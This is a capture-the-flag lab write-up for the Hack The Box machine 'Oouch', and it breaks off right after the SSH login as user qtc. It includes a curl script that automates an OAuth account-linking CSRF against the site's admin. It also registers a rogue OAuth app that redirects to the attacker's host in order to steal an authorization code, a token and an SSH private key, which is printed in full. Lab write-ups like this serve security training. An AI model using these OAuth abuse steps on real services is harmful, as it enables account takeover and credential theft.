# Oouch

## User

### nmap

```nmap
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      Session bandwidth limit in byte/s is 30000
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
5000/tcp open  http    nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.14.2
| http-title: Welcome to Oouch
|_Requested resource was http://10.10.10.177:5000/login?next=%2F
8000/tcp open  rtsp
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   RTSPRequest:
|     RTSP/1.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|     <h1>Bad Request (400)</h1>
|   SIPOptions:
|     SIP/2.0 400 Bad Request
|     Content-Type: text/html
|     Vary: Authorization
|_    <h1>Bad Request (400)</h1>
|_http-title: Site doesn't have a title (text/html).
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=4/13%Time=5E94FABE%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</
SF:h1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Req
SF:uest\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1
SF:>Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization
SF:\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.0\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Auth
SF:orization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP Server

Nmap shows us an anonymous FTP, and when we login we find a `project.txt` file that contains the following:

```
Flask -> Consumer
Django -> Authorization Server
```

### consumer.oouch.htb:5000

We can register and then login.  Once logged in we find a profile page that lists connected accounts, a page for changing passwords,
a documents page that looks empty, and an about page that mentions a 'secure authorization system', and a contact page that 
allows sending messages to the system administrator.  Some experimentation with the contact form shows that including a web
address, in pretty much any form, inside tags, on its own, whatever, results in a request to the server, but there's seemingly
no XSS that works.  In fact the exact string `<script>` returns a page saying

```
Hacking Attempt Detected
Dear hacker, did we not already told you, that this site is constructed following
the highest security standards? Well, we blocked your IP address for about one
minute and hope that you learn something from that.
```

Lets try some discovery...

```shell-session
╭─zoey@parrot-virtual ~/sec/htb/oouch ‹main› 
╰─$ gobuster dir -k -u http://10.10.10.177:5000 -x .php,.htm,.txt,.html,.aspx,.asp,.cfg,.xml -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.177:5000
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,aspx,asp,cfg,xml,php,htm,txt
[+] Timeout:        10s
===============================================================
2021/02/01 07:04:47 Starting gobuster
===============================================================
/about (Status: 302)
/contact (Status: 302)
/documents (Status: 302)
/home (Status: 302)
/login (Status: 200)
/logout (Status: 302)
/oauth (Status: 302)
/profile (Status: 302)
/register (Status: 200)
===============================================================
2021/02/01 07:10:01 Finished
===============================================================
```

Running gobuster gives us an `/oauth` route. Navigating to it shows a hidden developer page that states the following:

```
OAuth Endpoint
Please notice: This functionality is currently under development and not ready to be used in production.
However, since you know about this hidden URL, it seems that you got developer access and are supposed
to use it.

In order to connect your account with our Oouch authorization server, please visit:

http://consumer.oouch.htb:5000/oauth/connect
Once your account is connected, you should be able to use the authorization server for login. Just visit:

http://consumer.oouch.htb:5000/oauth/login
```

Following the `consumer.oouch.htb:5000/oauth/connect` link we get a redirect to `authorization.oouch.htb:8000`. Adding this to `/etc/hosts` we can access the virtual host on the http server on 8000 that we got a 400 response on before.

### authorization.oouch.htb:8000

Accessing `authorization.oouch.htb:8000` we get

```
Oouch - The Simple and Secure Authorization Server
Oouch is a simple authorization server based on the Oauth2 protocol. Instead of managing credentials
for multiple applications, just create an Oouch account and use it for login on supported applications.
Our platform provides maximum comfort and conforms to the highest security standards.

You have not signed it yet. Please choose between the following options:

Login at: login

Or signup for a new account: register

Notice: For registration we are asking you for SSH credentials to your Oouch orchestration server. This
is only required if you want to use the Oouch orchestration application. Since this one is currently
under development, you want most likely to ignore the SSH related fields inside of the registration form.
```

Once we register and login we see

```
Logged in as: pwn
You have successfully authenticated and should be able to use the authorization server :D

Relevant endpoints are:

/oauth/authorize
/oauth/token

Currently there are no options to modify profile information or for getting an overview of all
authorized applications. We will implement this soon.
```

### Inspecting Oauth Implementation

Everything seems to point to the oauth implementation being vulnerable, and we have the ability to make the administrator follow links, making GET requests.  Let's inspect the oauth setup to see what we can find.  First we'll create an account on the authorization server, and then link the
consumer server account. When we follow the `/oauth/connect` route on consumer to link our accounts, it responds with a redirect

```http
HTTP/1.1 302 FOUND
Server: nginx/1.14.2
Date: Mon, 01 Feb 2021 21:33:17 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 625
Connection: keep-alive
Location: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
Vary: Cookie
```

At this location is a dialog that asks whether you want to authorize linking the accounts. When clicking `authorize` a POST request is generated:

```http
POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read HTTP/1.1
Host: authorization.oouch.htb:8000
Connection: keep-alive
Content-Length: 266
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://authorization.oouch.htb:8000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: sessionid=xj6kzh0wooa2801xpy63vo4kmqw8u0a2; csrftoken=Pe9YvshvgiBB5boHk4SSR2U5uS1yKIFLWec1xzXUD4zl2J6xDVJzWg8iQc7sIxRi
```

The `sessionid` cookie is used by the authorization server to know which account is being linked, and the `client_id` in the query string is something that was likely generated by the authorization server when the consumer application was registered with it and is used to identify it. The response is a redirect:

```http
HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: http://consumer.oouch.htb:5000/oauth/connect/token?code=erdGdknibkFJl3ByyfoZ04fg24n7jL
X-Frame-Options: SAMEORIGIN
Content-Length: 0
Vary: Authorization, Cookie
```

With the final request to the redirect location being:

```http
GET /oauth/connect/token?code=erdGdknibkFJl3ByyfoZ04fg24n7jL HTTP/1.1
Host: consumer.oouch.htb:5000
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://authorization.oouch.htb:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=.eJwlj0tqAzEQBe-itReSWv3zZUyrPyQEEpixVyF3z4SsH1XU-26POvJ8a_fn8cpbe7xHuzcSEAeYA5EmolHvtDzRyqaqLWdzjjVhK4-YNXL7liJQdxXS2Bt3SLcsF2VmGzA4aCB0da7NizomhW1TEJO-FujeSWuhhLVb8_Oox_PrIz-vnigtunbvgrO4F3pCBPzZzYC6aA6edHGvM4__E7P9_AKTIz9I.YBewfQ.qQ7xapIM59eNp8cTsLA9Al4WMS0
```

The consumer application identifies the account to connect by the session cookie, and will validate the `code` that is passed and connect the accounts on success.  It's this request that we should be able to abuse, since if the admin were to follow this link, _their_ session cookie would be used, and
_their_ account would be connected to _our_ authorization server account, allowing us to login to the admin account.

### Gaining Admin Access

Lets script most of the calls necessary to link the admin account in case we have to do it multiple times.  The consumer server seems to pay
attention to csrf token values, but the authorization server not so much? We'll need to create a user on the authorization server, generate a request 
to link accounts so it gives us a URL for connecting the consumer account, create an account on the consumer server, then use that account to send the 
URL we got to the admin.  Once the admin visits the URL that we've sent, our newly created authorization server account should be linked.  Then all 
that's left to do is login to the authorization server and visit [http://consumer.oouch.htb:5000/oauth/login](http://consumer.oouch.htb:5000/oauth/login).

```sh
#!/bin/sh

GREEN="\e[0;32m"
CLEAR="\e[m"

USERNAME=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
PASSWORD="pwnage123"

# Register authorization user
echo "${GREEN}Registering user on authorization server - ${CLEAR}${USERNAME}"
curl 'http://authorization.oouch.htb:8000/signup/' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "csrfmiddlewaretoken=EHKGKseLDMhbLjLQyeiexrGHuOB9YJiehqOaD0SjjQcCrDDYRhZioJ0mmIVjK3EV&username=${USERNAME}&email=${USERNAME}%40email.com&password1=${PASSWORD}&password2=${PASSWORD}"

# Login authorization user and get cookie
echo "${GREEN}Logging into authorization server to get sessions cookie${CLEAR}"
A_SESSION_ID=$(curl -v 'http://authorization.oouch.htb:8000/login/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: csrftoken=iKF5itJYptsGv7g3BN79EKYZzLhIemf7a62GC5LSXDYIGxrHDRrEIvXyuci4k99k' --data-raw "csrfmiddlewaretoken=TiRHSWkN6TQutdXEmI1HcE6IEFkspiy1LEeicymHE3mwED8ioMlcgp5hz6lOv5se&username=${USERNAME}&password=${PASSWORD}" 2>&1 | grep sessionid | sed -r 's/.*sessionid=(\w+);.*/\1/')

echo "    ${GREEN}Got authorization session cookie: ${CLEAR} ${A_SESSION_ID}"

echo "${GREEN}Getting token/code url for linking the admin account${CLEAR}"
TOKEN_URL=$(curl -v 'http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' -H 'Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read' -H "Cookie: csrftoken=zzPf6uron6TdWlsqY1Rukb5GBnWlvM870RVoW2Q9ZWtEK3PmsxnsNp4Uv7lm9AjR; sessionid=${A_SESSION_ID}" --data-raw "csrfmiddlewaretoken=4bQYMzOq9z8PXZoRob64mvACboMoEBmKxv16oMApwJUAiAULjGbLV3Y4wZEtSWaB&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize" 2>&1 | grep 'code=' | sed -r 's/.*(http:)/\1/')

echo "    ${GREEN}Got token url: ${CLEAR} ${TOKEN_URL}"

# Get Session Cookie
echo "${GREEN}Getting consumer session id and csrf token${CLEAR}"
C_SESSION_ID=$(curl -v 'http://consumer.oouch.htb:5000/register' 2>&1 | grep session | sed -r 's/.*session=([a-zA-Z0-9._-]+);.*/\1/')
echo "    ${GREEN}Got consumer sessions cookie: ${CLEAR}${C_SESSION_ID}"

# Get CSRF Token
C_CSRF_TOKEN=$(curl 'http://consumer.oouch.htb:5000/register' -H "Cookie: session=${C_SESSION_ID}" | grep csrf_token | sed -r 's/.*value="([a-zA-Z0-9._-]+)">.*/\1/')
echo "    ${GREEN}Got consumer csrf token: ${CLEAR}${C_CSRF_TOKEN}"

# Register consumer user
echo "${GREEN}Registering user on consumer${CLEAR}"
curl --silent 'http://consumer.oouch.htb:5000/register' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' \
  -H 'Referer: http://consumer.oouch.htb:5000/register' \
  -H "Cookie: session=${C_SESSION_ID}" \
  --data-raw "csrf_token=${C_CSRF_TOKEN}&username=${USERNAME}&email=${USERNAME}%40test.com&password=${PASSWORD}&cpassword=${PASSWORD}&submit=Register"
echo "${USERNAME}"

# Login consumer user and get cookie
echo "${GREEN}Logging in to consumer account${CLEAR}"
C_SESSION_ID=$(curl -v 'http://consumer.oouch.htb:5000/login' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' -H 'Referer: http://consumer.oouch.htb:5000/login' -H "Cookie: session=${C_SESSION_ID}" --data-raw "csrf_token=${C_CSRF_TOKEN}&username=${USERNAME}&password=${PASSWORD}&remember_me=n&submit=Sign+In" 2>&1 | grep "Set-Cookie: session" | sed -r 's/.*session=([a-zA-Z0-9._-]+);.*/\1/')
echo "    ${GREEN}New session ID: ${CLEAR}${C_SESSION_ID}"

# Send message to admin
echo "${GREEN}Sending message to admin${CLEAR}"
curl --silent -X POST 'http://consumer.oouch.htb:5000/contact' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' \
  -H 'Referer: http://consumer.oouch.htb:5000/contact' \
  -H "Cookie: session=${C_SESSION_ID}" \
  -d "csrf_token=${C_CSRF_TOKEN}&textfield=${TOKEN_URL}&submit=Send" | grep "message was sent"

echo "\n${GREEN}Now log into the authorization server in the browser with ${CLEAR}${USERNAME}:${PASSWORD}${GREEN}, and then login to the admin account by visiting ${CLEAR}http://consumer.oouch.htb:5000/oauth/login"

```

### Admin Account

If everything went to plan we should now be logged in under the admin account, which seems to be `qtc` according to the `/profile` route:

|                       |                        |
| --------------------- | ---------------------- |
| `Username:`           | qtc                    |
| `Email:`              | qtc@nonexistend.nonono |
| `Connected-Accounts:` | admin.                 |

Navigating to `/documents` shows the following documents:

| | |
|-|-|
| `dev_access.txt` | develop:supermegasecureklarabubu123! -> Allows application registration. |
| `o_auth_notes.txt` | /api/get_user -> user data. oauth/authorize -> Now also supports GET method |
| `todo.txt` | Chris mentioned all users could obtain my ssh key. Must be a joke... |

### Finding the Application Registration

According to the `dev_access.txt` there's a way to register applications.  We haven't seen anything obvious to that effect, and the login credentials
don't work for the main login on the authorization server.  So after trying some discovery we find

```shell
╭─zoey@parrot-virtual ~/sec/htb/oouch ‹master› 
╰─$ gobuster dir -k -u http://authorization.oouch.htb:8000/oauth -x .php,.htm,.txt,.html,.aspx,.asp,.cfg,.xml -w /usr/share/dirb/wordlists/common.txt    ===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://authorization.oouch.htb:8000/oauth
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     xml,php,htm,txt,html,aspx,asp,cfg
[+] Timeout:        10s
===============================================================
2021/02/02 06:25:12 Starting gobuster
===============================================================
/applications (Status: 301)
===============================================================
2021/02/02 06:30:40 Finished
===============================================================
```

When visiting the `/oauth/applications` link in the browser we get a `Sign in` pop-up, but when we try using our login credentials, nothing.  So back to discovery...

```
╭─zoey@parrot-virtual ~/sec/htb/oouch ‹master› 
╰─$ gobuster dir -k -u http://authorization.oouch.htb:8000/oauth/applications -w /usr/share/dirb/wordlists/common.txt                                             
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://authorization.oouch.htb:8000/oauth/applications
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/02 06:37:50 Starting gobuster
===============================================================
/0 (Status: 301)
[...]
/register (Status: 301)
===============================================================
2021/02/02 06:38:27 Finished
===============================================================
```

And finally, we have a route, `/oauth/applications/register`, where our newly discovered credentials work.

### Dev Access to Application Registration

Accessing `authorization.oouch.htb:8000/oauth/applications/register` with the credentials in `dev_access.txt` gives a form with the following options:

```
Name
Client id
Client secret
Client type
Authorization grant type -
Redirect uris
```

Saving an application with the following information

```
Name - Malicious App
Client id - client-id
Client secret - client-secret
Client type -  Public
Authorization grant type - Authorization-code
Redirect uris - http://10.10.14.12:8081/oauth
```

results in a redirect to [http://authorization.oouch.htb:8000/oauth/applications/2/](http://authorization.oouch.htb:8000/oauth/applications/2/), which
has a form that allows updating via an `/2/update` route, and `/2/delete` allows deletion.

### Piecing It All Together

So we know from qtc's documents, that there's an `/api/get_user` route on the authorization server, and that somehow we can obtain qtc's ssh key.
Attempting to access `/api/get_user` directly we get a 403.  A little experimentation shows there's an `/api/get_ssh` route, but it 403s as well.
It would seem we need to get credentials for these routes utilizing our ability to register an application and the fact that you can use the GET verb 
on `oauth/authorize`. The fact that we can do a GET request seems to indicate we should use the `oauth/authorize` route in the contact form that sends 
messages to the admin. This was a POST request when we linked the admin account. There's also a route on the authorization server that we haven't used 
yet, `/oauth/token`.  With a little [research](https://www.oauth.com/oauth2-servers/access-tokens/) into tokens we learn that "access tokens are the  
hing that applications use to make API requests on behalf of a user."  That sounds promising given the API routes we want to access. Lets try and create 
our own application, use the contact form to authorize qtc's authorization server account, then use the resulting code to get a token, that will 
hopefully allow us to access the API routes.

### Owning User

Lets start with crafting a url to get the admin to authorize against our newly created application. It should look something like the following:

`http://authorization.oouch.htb:8000/oauth/authorize/?client_id=client-id&response_type=code&redirect_uri=http://10.10.14.12:8081/oauth&scope=read&allow=Authorize`

Now let's startup an http server on our attack box, that way we can view the incoming requests from the redirect. Then lets login to the consumer
application and send the link to the admin.

```http
╭─zoey@parrot-virtual ~/sec ‹master› 
╰─$ node tools/simple-http-server.js 8081
exfil and tools server listening on port 8081!
23:23:59: GET /oauth?code=M5ILhandrM4Ro5hOkYVxWSK7GKazqQ
        Host: 10.10.14.12:8081
        User-Agent: python-requests/2.21.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
        Cookie: sessionid=2cij4m2ltwo76a7hbaq0pkfjppmceu78;
```

If done properly you should get an authorization code and session cookie sent to your local http server via the redirect. Use them to request an
access token:

```shell
╭─zoey@parrot-virtual ~/sec/htb/oouch ‹master› 
╰─$ curl -v -b 'sessionid:"2cij4m2ltwo76a7hbaq0pkfjppmceu78"' -d 'client_id=client-id&client_secret=client-secret&grant_type=authorization_code&code=M5ILhandrM4Ro5hOkYVxWSK7GKazqQ' 'http://authorization.oouch.htb:8000/oauth/token/'
*   Trying 10.10.10.177:8000...
* Connected to authorization.oouch.htb (10.10.10.177) port 8000 (#0)
> POST /oauth/token/ HTTP/1.1
> Host: authorization.oouch.htb:8000
> User-Agent: curl/7.72.0
> Accept: */*
> Content-Length: 113
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 113 out of 113 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Type: application/json
< Cache-Control: no-store
< Pragma: no-cache
< X-Frame-Options: SAMEORIGIN
< Content-Length: 161
< Vary: Authorization
< 
* Connection #0 to host authorization.oouch.htb left intact
{"access_token": "O92WviZCP4TwlNPQDRtxaIFlXGnRoz", "expires_in": 600, "token_type": "Bearer", "scope": "read", "refresh_token": "kY27CINt7Afy0pV0svReyfQuR5remy"}
```

Now lets drop the access token into the authorization header on requests to the api:

```shell
╭─zoey@parrot-virtual ~/sec/htb/oouch ‹master› 
╰─$ curl -v 'http://authorization.oouch.htb:8000/api/get_user' -b 'sessionid=2cij4m2ltwo76a7hbaq0pkfjppmceu78' -H 'Authorization: Bearer O92WviZCP4TwlNPQDRtxaIFlXGnRoz'
*   Trying 10.10.10.177:8000...
* Connected to authorization.oouch.htb (10.10.10.177) port 8000 (#0)
> GET /api/get_user HTTP/1.1
> Host: authorization.oouch.htb:8000
> User-Agent: curl/7.72.0
> Accept: */*
> Cookie: sessionid=2cij4m2ltwo76a7hbaq0pkfjppmceu78
> Authorization: Bearer O92WviZCP4TwlNPQDRtxaIFlXGnRoz
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< X-Frame-Options: SAMEORIGIN
< Content-Length: 87
< Vary: Authorization
< 
* Connection #0 to host authorization.oouch.htb left intact
{"username": "qtc", "firstname": "", "lastname": "", "email": "qtc@nonexistend.nonono"}%                                                                                            
╭─zoey@parrot-virtual ~/sec/htb/oouch ‹master› 
╰─$ curl -v 'http://authorization.oouch.htb:8000/api/get_ssh' -b 'sessionid=2cij4m2ltwo76a7hbaq0pkfjppmceu78' -H 'Authorization: Bearer O92WviZCP4TwlNPQDRtxaIFlXGnRoz' 
*   Trying 10.10.10.177:8000...
* Connected to authorization.oouch.htb (10.10.10.177) port 8000 (#0)
> GET /api/get_ssh HTTP/1.1
> Host: authorization.oouch.htb:8000
> User-Agent: curl/7.72.0
> Accept: */*
> Cookie: sessionid=2cij4m2ltwo76a7hbaq0pkfjppmceu78
> Authorization: Bearer O92WviZCP4TwlNPQDRtxaIFlXGnRoz
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< X-Frame-Options: SAMEORIGIN
< Content-Length: 2708
< Vary: Authorization
< 
{"ssh_server": "consumer.oouch.htb", "ssh_user": "qtc", "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"}
```

And now we have the ssh key mentioned in qtc's documents.  Let's properly format the key, save it to file and use it to ssh into the box:

```shell
╭─zoey@parrot-virtual ~/sec/htb/oouch ‹master› 
╰─$ ssh -i qtc_rsa qtc@oouch.htb
Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3
qtc@oouch:~$ ls -la
total 36
drwxr-xr-x 4 qtc  qtc  4096 Feb 25  2020 .
drwxr-xr-x 3 root root 4096 Feb 11  2020 ..
